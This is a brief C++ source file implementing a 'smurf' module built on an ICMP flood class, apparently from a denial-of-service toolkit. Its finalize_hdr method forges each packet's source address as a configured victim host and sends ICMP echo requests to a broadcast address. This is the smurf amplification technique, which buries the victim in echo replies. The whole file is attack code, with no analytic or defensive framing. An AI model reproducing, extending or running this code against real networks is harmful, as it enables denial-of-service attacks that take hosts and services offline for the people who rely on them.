#include "smurf.hpp"

#include <arpa/inet.h>

smurf::smurf() : icmp_flood() {}

void smurf::finalize_hdr(icmphdr *icmp, iphdr *ip) {
  icmp->type = ICMP_ECHO;
  icmp->code = ICMP_NET_UNREACH;
  ip->daddr = inet_addr(Config::get().bcast.c_str());
  ip->saddr = inet_addr(Config::get().rhost.c_str());
  icmp_flood::finalize_hdr(icmp, ip);
}
